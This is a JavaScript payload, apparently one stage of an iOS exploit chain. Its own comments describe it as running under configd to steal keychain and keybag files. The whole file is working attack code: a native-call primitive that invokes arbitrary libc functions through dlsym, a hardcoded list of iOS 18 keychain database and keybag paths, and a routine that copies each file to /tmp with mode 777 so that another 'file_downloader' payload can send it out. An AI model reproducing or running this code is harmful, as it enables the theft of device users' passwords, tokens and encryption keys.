// Keychain/Keybag Copier Payload
// Runs under configd context which has access to keychain files
// Copies keychain/keybag files to /tmp with 777 permissions
// The main file_downloader payload will then send them

class Native {
	
	static #baseAddr;
	static #dlsymAddr;
	static #memcpyAddr;
	static #mallocAddr;
	static #oinvAddr;
	
	static mem = 0n;
	static memSize = 0x4000;
	
	static #argMem = 0n;
	static #argMemPtr = 0n;
	static #argMemPtrStr = 0n;
	static #argPtr = 0n;
	static #argPtrPtr = 0n;
	static #argPtrStrPtr = 0n;

	static #dlsymCache = {};
	
	static init() {
		const buff = new BigUint64Array(nativeCallBuff);
		this.#baseAddr = buff[20];
		this.#dlsymAddr = buff[21];
		this.#memcpyAddr = buff[22];
		this.#mallocAddr = buff[23];
		this.#oinvAddr = buff[24];
		
		this.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));
		this.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argPtr = this.#argMem;
		this.#argPtrPtr = this.#argMemPtr;
		this.#argPtrStrPtr = this.#argMemPtrStr;
	}
	
	static write(ptr, buff) {
		if (!ptr) return false;
		let buff8 = new Uint8Array(nativeCallBuff);
		let offs = 0;
		let left = buff.byteLength;
		while (left) {
			let len = left;
			if (len > 0x1000) len = 0x1000;
			buff8.set(new Uint8Array(buff, offs, len), 0x1000);
			this.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));
			left -= len;
			offs += len;
		}
		return true;
	}
	
	static read(ptr, length) {
		if (!ptr) return null;
		let buff = new ArrayBuffer(length);
		let buff8 = new Uint8Array(buff);
		let offs = 0;
		let left = length;
		while (left) {
			let len = left;
			if (len > 0x1000) len = 0x1000;
			this.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));
			buff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);
			left -= len;
			offs += len;
		}
		return buff;
	}
	
	static readPtr(ptr) {
		let buff = this.read(ptr, 8);
		const view = new DataView(buff);
		return view.getBigUint64(0, true);
	}
	
	static read32(ptr) {
		let buff = this.read(ptr, 4);
		const view = new DataView(buff);
		return view.getInt32(0, true);
	}
	
	static write64(ptr, value) {
		const buff = new ArrayBuffer(8);
		const view = new DataView(buff);
		view.setBigUint64(0, value, true);
		this.write(ptr, buff);
	}
	
	static readString(ptr, len=1024) {
		let buff = this.read(ptr, len);
		return this.bytesToString(buff, false);
	}
	
	static writeString(ptr, str) {
		const buff = this.stringToBytes(str, true);
		this.write(ptr, buff);
	}
	
	static callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {
		this.#argPtr = this.#argMem;
		x0 = this.#toNative(x0);
		x1 = this.#toNative(x1);
		x2 = this.#toNative(x2);
		x3 = this.#toNative(x3);
		x4 = this.#toNative(x4);
		x5 = this.#toNative(x5);
		x6 = this.#toNative(x6);
		x7 = this.#toNative(x7);
		let ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);
		this.#argPtr = this.#argMem;
		return ret;
	}

	static bytesToString(bytes, includeNullChar=true) {
		let bytes8 = new Uint8Array(bytes);
		let str = "";
		for (let i=0; i<bytes8.length; i++) {
			if (!includeNullChar && !bytes8[i]) break;
			str += String.fromCharCode(bytes8[i]);
		}
		return str;
	}
	
	static stringToBytes(str, nullTerminated=false) {
		let buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));
		let s8 = new Uint8Array(buff);
		for (let i=0; i<str.length; i++)
			s8[i] = str.charCodeAt(i);
		if (nullTerminated) s8[str.length] = 0x0;
		return s8.buffer;
	}
	
	static #toNative(value) {
		if (!value) return 0n;
		if (typeof value === 'string') {
			if (value.length >= 0x1000) return 0n;
			let ptr = this.#argPtr;
			this.writeString(ptr, value);
			this.#argPtr += BigInt(value.length + 1);
			return ptr;
		}
		else if (typeof value === 'bigint') return value;
		else return BigInt(value);
	}

	static #dlsym(name) {
		if (!name) return 0n;
		let addr = this.#dlsymCache[name];
		if (addr) return addr;
		const RTLD_DEFAULT = 0xfffffffffffffffen;
		const nameBytes = this.stringToBytes(name, true);
		let buff8 = new Uint8Array(nativeCallBuff);
		buff8.set(new Uint8Array(nameBytes), 0x1000);
		addr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);
		if (addr) this.#dlsymCache[name] = addr;
		return addr;
	}
	
	static #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {
		let buff = new BigInt64Array(nativeCallBuff);
		buff[0] = addr;
		buff[100] = x0;
		buff[101] = x1;
		buff[102] = x2;
		buff[103] = x3;
		buff[104] = x4;
		buff[105] = x5;
		buff[106] = x6;
		buff[107] = x7;
		invoker();
		return buff[200];
	}
	
	static #nativeCallSymbol(name, ...args) {
		const funcAddr = this.#dlsym(name);
		const ret64 = this.#nativeCallAddr(funcAddr, ...args);
		if (ret64 < 0xffffffffn && ret64 > -0xffffffffn) return Number(ret64);
		return ret64;
	}
}

// ============================================================================
// Configuration
// ============================================================================

const TAG = "INFO";

// Destination directory for copied files
const DEST_DIR = "/tmp";

// ============================================================================
// Keychain and Keybag Files to Copy (iOS 18)
// ============================================================================

const KEYCHAIN_FILES = [
	// Keychain database
	{ src: "/private/var/Keychains/keychain-2.db", dst: "keychain-2.db" },
	
	// Keybag files in /var/keybags
	{ src: "/var/keybags/persona.kb", dst: "persona.kb" },
	{ src: "/var/keybags/usersession.kb", dst: "usersession.kb" },
	{ src: "/var/keybags/backup/backup_keys_cache.sqlite", dst: "backup_keys_cache.sqlite" },
	{ src: "/private/var/keybags/persona.kb", dst: "persona_private.kb" },
	{ src: "/private/var/keybags/usersession.kb", dst: "usersession_private.kb" },
	
	// Keybag files in Keychains directory
	{ src: "/private/var/Keychains/System.keybag", dst: "System.keybag" },
	{ src: "/private/var/Keychains/Backup.keybag", dst: "Backup.keybag" },
	{ src: "/private/var/Keychains/persona.kb", dst: "persona_keychains.kb" },
	{ src: "/private/var/Keychains/usersession.kb", dst: "usersession_keychains.kb" },
	{ src: "/private/var/Keychains/device.kb", dst: "device.kb" },
];

// ============================================================================
// Helper Functions
// ============================================================================

function fileExists(filePath) {
	const result = Native.callSymbol("access", filePath, 0);
	return Number(result) === 0;
}

function getFileSize(filePath) {
	try {
		const statBuf = Native.callSymbol("malloc", BigInt(144));
		if (!statBuf || statBuf === 0n) return -1;
		
		try {
			const statResult = Native.callSymbol("stat", filePath, statBuf);
			if (statResult !== 0) return -1;
			
			const statData = Native.read(statBuf, 144);
			const statView = new DataView(statData);
			return Number(statView.getBigUint64(0x60, true));
		} finally {
			Native.callSymbol("free", statBuf);
		}
	} catch (e) {
		return -1;
	}
}

/**
 * Copy a file from src to dst with specified permissions
 */
function copyFile(srcPath, dstPath, mode) {
	try {
		// Check if source exists
		if (!fileExists(srcPath)) {
			return false;
		}
		
		const fileSize = getFileSize(srcPath);
		if (fileSize < 0) {
			return false;
		}
		
		if (fileSize === 0) {
			return false;
		}
		
		// Open source for reading
		const srcFd = Native.callSymbol("open", srcPath, 0); // O_RDONLY
		if (Number(srcFd) < 0) {
			return false;
		}
		
		try {
			// Create/open destination for writing
			// O_WRONLY | O_CREAT | O_TRUNC = 0x601
			const dstFd = Native.callSymbol("open", dstPath, 0x601, mode);
			if (Number(dstFd) < 0) {
				return false;
			}
			
			try {
				// Copy in chunks
				const chunkSize = 64 * 1024;
				let totalCopied = 0;
				
				while (totalCopied < fileSize) {
					const remaining = fileSize - totalCopied;
					const toRead = remaining > chunkSize ? chunkSize : remaining;
					
					const buf = Native.callSymbol("malloc", BigInt(toRead));
					if (!buf || buf === 0n) break;
					
					try {
						const bytesRead = Native.callSymbol("read", srcFd, buf, toRead);
						if (Number(bytesRead) <= 0) break;
						
						const bytesWritten = Native.callSymbol("write", dstFd, buf, Number(bytesRead));
						if (Number(bytesWritten) <= 0) break;
						
						totalCopied += Number(bytesWritten);
					} finally {
						Native.callSymbol("free", buf);
					}
				}
				
				// Set permissions to 777 (0777 = 511 decimal)
				Native.callSymbol("chmod", dstPath, mode);
				
				return totalCopied > 0;
				
			} finally {
				Native.callSymbol("close", dstFd);
			}
		} finally {
			Native.callSymbol("close", srcFd);
		}
		
	} catch (e) {
		return false;
	}
}

// ============================================================================
// Main Execution
// ============================================================================

Native.init();


try {
	let successCount = 0;
	let failCount = 0;
	
	for (const file of KEYCHAIN_FILES) {
		const srcPath = file.src;
		const dstPath = DEST_DIR + "/" + file.dst;
		
		
		// Copy with 777 permissions (0777 = 511)
		if (copyFile(srcPath, dstPath, 511)) {
			successCount++;
		} else {
			failCount++;
		}
	}
	
	
} catch (e) {
}


